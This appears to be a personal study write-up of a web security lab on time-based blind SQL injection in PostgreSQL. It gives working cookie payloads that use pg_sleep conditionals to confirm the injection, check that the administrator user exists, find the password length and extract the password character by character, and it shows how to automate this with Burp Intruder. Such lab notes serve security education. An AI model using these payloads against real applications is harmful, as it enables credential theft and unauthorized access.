# Blind SQL Injection - Time Delays

## Overview

Time-based blind SQL injection can be used when:

- The application is vulnerable to SQL injection.
- The HTTP response does not reveal the query result.
- Database errors are handled by the application.
- There is no useful difference in the normal response.

Instead of relying on the response content or an error, we use a time delay as a TRUE/FALSE signal.

---

## PostgreSQL Time Delay

In the lab, the database was PostgreSQL.

A conditional delay can be created with:

    TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--

If the condition is TRUE:

    1=1

the database executes:

    pg_sleep(5)

and the response is delayed by approximately 5 seconds.

For a FALSE condition:

    TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--

The database executes:

    pg_sleep(0)

so there is no intentional delay.

The basic logic is:

    TRUE  → Response delayed
    FALSE → Normal response

---

## Checking for a Specific User

Once the time delay works, we can use it to test database information.

Example:

    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--

If the response is delayed, the condition is TRUE and the specified user exists.

---

## Determining Password Length

The same technique can be used to determine the length of a value.

Example:

    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--

If the response is delayed, the password length is 20 characters.

The length can be tested by changing the value:

    LENGTH(password)=1
    LENGTH(password)=2
    LENGTH(password)=3
    ...
    LENGTH(password)=20

---

## Extracting the Password Character by Character

After determining the length, individual characters can be tested.

Example:

    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--

The important part is:

    SUBSTRING(password,1,1)

This checks the first character of the password.

The character marked with:

    §a§

is replaced by Burp Intruder payloads.

After finding the first character, the position changes:

    SUBSTRING(password,2,1)

Then:

    SUBSTRING(password,3,1)

and so on.

---

## Burp Intruder

Burp Intruder can automate the character testing process.

The payload position is placed around the character:

    ='§a§'

The response time is then used as the indicator.

For example:

    ~3000 ms → Character is correct
    Normal response → Character is incorrect

In the lab, a shorter delay was used to speed up the process.

Because the requests depend on timing, the Intruder resource pool was configured with:

    Maximum concurrent requests = 1

This helps avoid overlapping requests affecting the timing results.

---

## Practical Workflow

    1. Identify blind SQL injection
            ↓
    2. Confirm a conditional time delay
            ↓
    3. Determine whether the target user exists
            ↓
    4. Determine the password length
            ↓
    5. Test each character
            ↓
    6. Automate with Burp Intruder
            ↓
    7. Reconstruct the complete value

---

## Key Takeaways

- Time-based blind SQLi uses response time as a TRUE/FALSE signal.
- `pg_sleep()` can create a delay in PostgreSQL.
- A conditional `CASE WHEN` statement can trigger the delay.
- The same technique can determine whether a user exists.
- `LENGTH()` can be used to determine the length of a value.
- `SUBSTRING()` can extract individual characters.
- Burp Intruder can automate the character enumeration.
- Timing attacks require careful request configuration because concurrent requests can interfere with the results.